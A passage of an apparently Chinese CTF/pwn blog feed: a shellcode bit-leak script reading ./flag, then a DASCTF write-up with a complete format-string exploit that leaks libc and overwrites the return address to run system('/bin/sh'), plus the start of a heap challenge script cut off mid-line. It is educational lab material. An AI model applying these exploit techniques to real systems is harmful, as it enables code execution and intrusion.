class=\"string\">&quot;./flag&quot;</span>,constants.O_RDONLY,<span class=\"literal\">None</span>) <span class=\"comment\"># 打开文件</span></span><br><span class=\"line\">        shellcode += pwnlib.shellcraft.amd64.mov(<span class=\"string\">&quot;r8&quot;</span>,<span class=\"string\">&quot;rax&quot;</span>) <span class=\"comment\"># 把句柄给r8</span></span><br><span class=\"line\">        shellcode += pwnlib.shellcraft.amd64.lseek(<span class=\"string\">&quot;r8&quot;</span>,i,<span class=\"number\">0</span>) <span class=\"comment\"># lseek 读写文件偏移量,这个就是说,一个字节一个字节读,</span></span><br><span class=\"line\">        shellcode += pwnlib.shellcraft.amd64.read(<span class=\"string\">&quot;r8&quot;</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">1</span>) <span class=\"comment\"># 把内容读取1字节,读到rsp上</span></span><br><span class=\"line\">        shellcode += <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">            movzx eax, BYTE PTR [rsp]  #把rsp指向的地址处的要比较的字符读取到al中,0扩展到eax</span></span><br><span class=\"line\"><span class=\"string\">            movsx edx,al    # 把要比较的字符放到edx中</span></span><br><span class=\"line\"><span class=\"string\">            mov eax,%s   #把变量放到eax中,就是循环变量 j ,以此循环每个位,一共8位</span></span><br><span class=\"line\"><span class=\"string\">            mov ecx,eax  # 把变量放到ecx</span></span><br><span class=\"line\"><span class=\"string\">            sar edx,cl   # 右移 cl位</span></span><br><span class=\"line\"><span class=\"string\">            mov eax,edx</span></span><br><span class=\"line\"><span class=\"string\">            and eax,1</span></span><br><span class=\"line\"><span class=\"string\">            test eax,eax # and运算、测试是1还是0</span></span><br><span class=\"line\"><span class=\"string\">            je .L2 # jz的别名,如果是0,跳转L2</span></span><br><span class=\"line\"><span class=\"string\">        .L3:</span></span><br><span class=\"line\"><span class=\"string\">            jmp .L3</span></span><br><span class=\"line\"><span class=\"string\">        .L2:</span></span><br><span class=\"line\"><span class=\"string\">            leave</span></span><br><span class=\"line\"><span class=\"string\">            ret</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span> % j          <span class=\"comment\"># 这个是填充%s变量的</span></span><br><span class=\"line\">        shellcode = asm(shellcode)</span><br><span class=\"line\">        p.send(shellcode+<span class=\"string\">b&quot;\\0&quot;</span>*(<span class=\"number\">0x1000</span>-<span class=\"built_in\">len</span>(shellcode)))</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            p.recv(timeout=<span class=\"number\">1</span>)  <span class=\"comment\"># 1,移位然后或,把新的一位设置为1</span></span><br><span class=\"line\">            c = (c&gt;&gt;<span class=\"number\">1</span>) | <span class=\"number\">128</span>   <span class=\"comment\"># 0000 0000     1000 0000  f 0x66 0b1100110</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> EOFError:   <span class=\"comment\"># 0 , leave ret后EOFError</span></span><br><span class=\"line\">            c = c&gt;&gt;<span class=\"number\">1</span></span><br><span class=\"line\">    sys.stdout.write(<span class=\"built_in\">chr</span>(c))</span><br><span class=\"line\">    flag += <span class=\"built_in\">chr</span>(c)</span><br><span class=\"line\">    sys.stdout.flush()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"汇编分析\"><a href=\"#汇编分析\" class=\"headerlink\" title=\"汇编分析\"></a>汇编分析</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* open(file=&#x27;flag&#x27;, oflag=0, mode=0) */</span><br><span class=\"line\">   /* push b&#x27;flag\\x00&#x27; */</span><br><span class=\"line\">   push 0x67616c66</span><br><span class=\"line\">   mov rdi, rsp</span><br><span class=\"line\">   xor edx, edx /* 0 */</span><br><span class=\"line\">   xor esi, esi /* 0 */</span><br><span class=\"line\">   /* call open() */</span><br><span class=\"line\">   push SYS_open /* 2 */</span><br><span class=\"line\">   pop rax</span><br><span class=\"line\">   syscall</span><br><span class=\"line\">   mov r8, rax   # 返回值,句柄,</span><br><span class=\"line\">   /* lseek(fd=&#x27;r8&#x27;, offset=0, whence=0)  这是第一次,偏移为0*/</span><br><span class=\"line\">   mov rdi, r8</span><br><span class=\"line\">   xor edx, edx /* 0 */</span><br><span class=\"line\">   xor esi, esi /* 0 */</span><br><span class=\"line\">   /* call lseek() */</span><br><span class=\"line\">   push SYS_lseek /* 8 */</span><br><span class=\"line\">   pop rax</span><br><span class=\"line\">   syscall</span><br><span class=\"line\">   /* call read(&#x27;r8&#x27;, &#x27;rsp&#x27;, 1) */</span><br><span class=\"line\">   xor eax, eax /* SYS_read */</span><br><span class=\"line\">   mov rdi, r8</span><br><span class=\"line\">   push 1</span><br><span class=\"line\">   pop rdx</span><br><span class=\"line\">   mov rsi, rsp</span><br><span class=\"line\">   syscall  # 系统调用号是0 前面xor即可</span><br><span class=\"line\"></span><br><span class=\"line\">           movzx    eax, BYTE PTR [rsp]</span><br><span class=\"line\">           movsx    edx, al</span><br><span class=\"line\">           mov    eax, 0</span><br><span class=\"line\">           mov    ecx, eax</span><br><span class=\"line\">           sar    edx, cl</span><br><span class=\"line\">           mov    eax, edx</span><br><span class=\"line\">           and    eax, 1</span><br><span class=\"line\">           test    eax, eax</span><br><span class=\"line\">           je    .L2</span><br><span class=\"line\">       .L3:</span><br><span class=\"line\">           jmp    .L3</span><br><span class=\"line\">       .L2:</span><br><span class=\"line\">           leave</span><br><span class=\"line\">           ret</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h2><p>调试的话,可以直接pwntools+gdb调,也可以写段汇编自己调试</p>\n<h2 id=\"接收字符分析\"><a href=\"#接收字符分析\" class=\"headerlink\" title=\"接收字符分析\"></a>接收字符分析</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    p.recv(timeout=<span class=\"number\">1</span>)  <span class=\"comment\"># 收到消息了,是1,移位然后或,把新的一位设置为1</span></span><br><span class=\"line\">    c = (c&gt;&gt;<span class=\"number\">1</span>) | <span class=\"number\">128</span>   <span class=\"comment\"># 0000 0000     1000 0000  f 0x66 0b1100110</span></span><br><span class=\"line\"><span class=\"keyword\">except</span> EOFError:       <span class=\"comment\"># 0 </span></span><br><span class=\"line\">    c = c&gt;&gt;<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t以接收f的过程为例, f是 0b01100110 </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/side# python3 <span class=\"number\">1.</span>py</span><br><span class=\"line\"><span class=\"number\">0b0</span></span><br><span class=\"line\"><span class=\"number\">0b10000000</span></span><br><span class=\"line\"><span class=\"number\">0b11000000</span></span><br><span class=\"line\"><span class=\"number\">0b1100000</span></span><br><span class=\"line\"><span class=\"number\">0b110000</span></span><br><span class=\"line\"><span class=\"number\">0b10011000</span></span><br><span class=\"line\"><span class=\"number\">0b11001100</span></span><br><span class=\"line\"><span class=\"number\">0b1100110</span></span><br><span class=\"line\">f</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t上面是直接print(bin(c))打印的每次的输出结果,其实不是很好看,补全后就明朗了,就是每次接收一个字符都会往后移动一位,然后前面的就是新的一位</p>\n<p>0b<font color=\"red\">0</font>0000000<br>0b<font color=\"red\">10</font>000000<br>0b<font color=\"red\">110</font>00000<br>0b<font color=\"red\">0110</font>0000<br>0b<font color=\"red\">00110</font>000<br>0b<font color=\"red\">100110</font>00<br>0b<font color=\"red\">1100110</font>0<br>0b<font color=\"red\">01100110</font></p>\n<p>​\t\t刚开始一直不明白是0还是1的时候才会接收到消息,也就是说是,leave;ret;会接收到消息,还是一直jmp会接收到消息,现在看结果是一直jmp会接收到消息,这是为什么呢?</p>\n<p>​\t\t嘶,感觉其实不是接收到了消息,而是时间到了后,也没有报错,就继续往下执行了,但如果是0的话,就会exit退出,然后EOFError,1的话接收时间过了,就执行下面代码了.</p>\n<h2 id=\"留的小尾巴\"><a href=\"#留的小尾巴\" class=\"headerlink\" title=\"留的小尾巴\"></a>留的小尾巴</h2><p>了解一下怎么调试汇编吧..直接编写汇编代码调试</p>\n<p>还没用时间侧信道来做呢…</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/",
            "title": "pwn入门-31-DASCTF六月二进制专项-1",
            "date_published": "2023-06-05T09:50:57.000Z",
            "content_html": "<p>​\t\t和哥几个打的这个比赛,虽然只做出了几道题,但是还有几道其实也都差不多了,思路都没问题,还是因为细节的问题,对原理的掌握不够深入导致的问题,还得再好好打基础和巩固.</p>\n<h1 id=\"fooooood\"><a href=\"#fooooood\" class=\"headerlink\" title=\"fooooood\"></a>fooooood</h1><p>​\t\t这道格式化字符串题给自己整的太恶心了..主要是很久不做格式化字符串了,然后当时理解的没那么深入,有些小问题就卡死了…</p>\n<p>​\t\t非栈上的格式化字符串利用, 看到一种方法是可以利用栈上已有的指针,当时也用了,不过不知道为什么利用格式化字符串写数据的时候有问题….回头再专门学一下</p>\n<p>​\t\t这是一条可以利用的链</p>\n<p>​\t\t感觉自己的思路是没有问题的,<font color=\"red\">但是对格式化字符串的一些利用的小点不是很熟悉,就导致了问题</font></p>\n<p>​\t\t<img src=\"/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/image-20230605163719082.png\" alt=\"image-20230605163719082\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-31-DASCTF%E5%85%AD%E6%9C%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-1/image-20230605172305883.png\" alt=\"image-20230605172305883\"></p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>​\t\t主要分了几部分,先把for循环的i改大一点,因为要循环很多次,然后还要地址泄露,再之后呢,写一个格式化字符串的替换函数,把返回地址修改了就可以了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Give me your name:&quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;test&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;favourite food: &quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;%11$p&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;You like &quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#data = (io.recvline().strip()).decode().split(&#x27;.&#x27;)</span></span><br><span class=\"line\">rsp = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;!?&#x27;</span>)[:-<span class=\"number\">2</span>],<span class=\"number\">16</span>)-<span class=\"number\">248</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(rsp))</span><br><span class=\"line\">i = rsp+<span class=\"number\">4</span></span><br><span class=\"line\">i_off = i&amp;<span class=\"number\">0xffff</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(i_off))</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;%&#x27;</span>+<span class=\"built_in\">str</span>(i_off).encode()+<span class=\"string\">b&#x27;c%11$hn&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;%&#x27;</span>+<span class=\"built_in\">str</span>(<span class=\"number\">40</span>).encode()+<span class=\"string\">b&#x27;c%37$hhn&#x27;</span></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\"><span class=\"comment\"># 泄露libc</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;%9$p&#x27;</span></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;You like &quot;</span>)</span><br><span class=\"line\">libc.address = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;!?&#x27;</span>)[:-<span class=\"number\">2</span>],<span class=\"number\">16</span>) - <span class=\"number\">240</span>- libc.sym.__libc_start_main</span><br><span class=\"line\"><span class=\"comment\">#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述 （1）与（2）两个栈地址在格式化字符串中的偏移</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">overlap</span>(<span class=\"params\">dest,ptr,off1,off2</span>):</span><br><span class=\"line\">    d = dest&amp;<span class=\"number\">0xff</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> ptr:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        payload=<span class=\"string\">b&#x27;%&#x27;</span>+<span class=\"built_in\">str</span>(d).encode()+<span class=\"string\">b&#x27;c%&#x27;</span>+<span class=\"built_in\">str</span>(off1).encode()+<span class=\"string\">b&#x27;$hhn&#x27;</span></span><br><span class=\"line\">        io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\">        f=ptr&amp;<span class=\"number\">0xff</span></span><br><span class=\"line\">        payload=<span class=\"string\">b&#x27;%&#x27;</span>+<span class=\"built_in\">str</span>(f).encode()+<span class=\"string\">b&#x27;c%&#x27;</span>+<span class=\"built_in\">str</span>(off2).encode()+<span class=\"string\">b&#x27;$hhn&#x27;</span></span><br><span class=\"line\">        io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\">        d+=<span class=\"number\">1</span></span><br><span class=\"line\">        ptr&gt;&gt;=<span class=\"number\">8</span></span><br><span class=\"line\">ret=rsp+<span class=\"number\">0x18</span></span><br><span class=\"line\">ptr=libc.address+<span class=\"number\">0x21112</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;%&#x27;</span>+<span class=\"built_in\">str</span>(ret&amp;<span class=\"number\">0xffff</span>).encode()+<span class=\"string\">b&#x27;c%&#x27;</span>+<span class=\"built_in\">str</span>(<span class=\"number\">25</span>).encode()+<span class=\"string\">b&#x27;$hn&#x27;</span></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\"><span class=\"comment\"># 覆盖返回地址</span></span><br><span class=\"line\">overlap(ret,ptr,<span class=\"number\">25</span>,<span class=\"number\">39</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">overlap(ret+<span class=\"number\">8</span>,libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>).__next__(),<span class=\"number\">25</span>,<span class=\"number\">39</span>)</span><br><span class=\"line\">overlap(ret+<span class=\"number\">16</span>,libc.sym.system,<span class=\"number\">25</span>,<span class=\"number\">39</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;food: &#x27;</span>,payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t自己之前的exp..回头检查下是哪的问题</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Give me your name:&quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;test&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;favourite food: &quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;%31$p.%21$p&quot;</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;You like &quot;</span>)</span><br><span class=\"line\">data = (io.recvline().strip()).decode().split(<span class=\"string\">&#x27;.&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(data)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#libc_addr = int(data[3],16)-0x20840</span></span><br><span class=\"line\">first_addr = <span class=\"built_in\">int</span>(data[<span class=\"number\">0</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(first_addr))</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(libc_addr))</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(ret_addr))</span></span><br><span class=\"line\"><span class=\"comment\">#onegadget = libc_addr + 0x45226</span></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">payload = fmtstr_payload(<span class=\"number\">31</span>,&#123;<span class=\"number\">0x7fffff</span>:<span class=\"number\">0x7fffff</span>&#125;)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\"><span class=\"comment\">#payload = b&quot;%58248c%31$n&quot;</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;%.26204x%30$n&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;favourite food: &quot;</span>)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;You like &quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t存储备忘的信息</p>\n<p>%10$p.%15$p.aaa</p>\n<p>%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.</p>\n<p>0x7fffffffbdc0.0x7ffff7dd3780.0x7ffff7b043c0.0x7ffff7ff6700.0x9.0x1ffffe540.0xc144e077e3cf5200.0x555555554b60.0x7ffff7a2d840.(nil).37</p>\n<p>为什么不按顺序了…</p>\n<p>0x7fffffffbdc0.0x7ffff7dd3780.0x7ffff7b043c0.0x7ffff7ff6700.0x9.0x3ffffe540.0xb1fb67251108900.0x555555554b60.0x7ffff7a2d840.(nil).0x7fffffffe548test’</p>\n<p>%12$p.%13$p.%14$p.%15$p.aaa</p>\n<p>0x1f7ffcca0.0x555555554a67.(nil).0x7da3d3a4544d517e.aaa37</p>\n<p>%16$p.%17$p.%18$p.%19$p.aaa</p>\n<p>x555555554820.0x7fffffffe540.(nil).(nil).aaa</p>\n<p>%20$p.%21$p.%22$p.%23$p.aaa</p>\n<p>0x4f7197cdb841edfc.0x4f718777df51edfc.(nil).(nil).aaa</p>\n<p>%24$p.%25$p.%26$p.%27$p.aaa</p>\n<p>(nil).0x7fffffffe558.0x7ffff7ffe168.0x7ffff7de780b.aaa</p>\n<p>%28$p.%29$p.%30$p.%31$p.aaa</p>\n<p>(nil).(nil).0x555555554820.0x7fffffffe540.aaa</p>\n<p>%32$p.%33$p.%34$p.%35$p.aaa</p>\n<p>(nil).0x555555554849.0x7fffffffe538.0x1c.aaa</p>\n<p>%36$p.%37$p.%38$p.%39$p.aaa</p>\n<p>0x1.0x7fffffffe79c.(nil).0x7fffffffe7ba.aaa</p>\n<p>0x7fffffffe388</p>\n<p>0xffffe388</p>\n<p>0xe388</p>\n<p>11个位置 -0xd0</p>\n<p><a href=\"https://blog.csdn.net/qq_52877079/article/details/129756543\">https://blog.csdn.net/qq_52877079/article/details/129756543</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/184717\">https://www.anquanke.com/post/id/184717</a></p>\n<h1 id=\"easynote\"><a href=\"#easynote\" class=\"headerlink\" title=\"easynote\"></a>easynote</h1><p>​\t\t简单的一道菜单堆题,看的时候很眼熟很眼熟,果然是之前做过的,只是稍微改动</p>\n<p>​\t\t<a href=\"https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/\">https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/</a></p>\n<p>​\t\t开启了pie,那就用largebin smallbin的main_arena来泄露地址,</p>\n<p>​\t\t这里有个小坑,就是接收返回地址的时候一直接收不到,注意这是因为先接收到了\\n,用recv应该是接收到\\n为止? 所以可以用多个recv或者recvuntil,</p>\n<p>​\t\tmalloc有检测,回头分析源码的时候可以具体看看</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = <span class=\"string\">&quot;./pwn&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(elf)</span><br><span class=\"line\"><span class=\"meta\">#p = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,25350)</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"meta\">#gdb.attach(p)</span></span><br><span class=\"line\">def add(size,content):</span><br><span 